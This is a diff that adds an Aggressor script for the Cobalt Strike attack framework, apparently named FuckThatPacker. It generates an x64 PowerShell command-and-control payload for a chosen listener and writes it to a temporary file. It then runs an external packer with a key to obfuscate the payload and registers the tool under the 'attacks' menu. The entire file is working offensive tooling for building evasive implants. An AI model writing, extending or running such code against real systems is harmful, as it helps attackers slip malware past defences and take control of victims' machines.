@@ -1,0 +1,30 @@
+sub generatePacker {
+        $key = $3['key'];
+        $listener = $3['listener'];
+        $output = $3['output'];
+        $data = artifact_payload($listener,"powershell","x64");
+        $handle = openf(">/tmp/temp_nonpacked.ps1");
+        writeb($handle, $data);
+        closef($handle);
+        $cmd = "/opt/Tools/FuckThatPacker/FuckThatPacker.py -k ". $key . " -p /tmp/temp_nonpacked.ps1 -o " . $output;
+        $out = exec($cmd);
+        $data = readAll($out);
+        println("[+] Packed payload stored in $output")
+}
+sub fuckThatPacker {
+        $dialog = dialog("FuckThatPacker", %(listener => "Listener: ", payload_type => "Payload Type: ", Output => "Output: "), &generatePacker);
+        dialog_description($dialog, "Generates a packed powershell payload.\n Author Unknow101");
+        drow_listener($dialog, "listener", "Listener: ");
+        drow_text($dialog, "key", "Key : ");
+        drow_text($dialog, "output", "Output : ");
+        dbutton_action($dialog, "Generate");
+        dialog_show($dialog);
+}
+
+
+
+popup attacks{
+        item ("FuckThatPacker", { 
+                fuckThatPacker();
+        });
+}
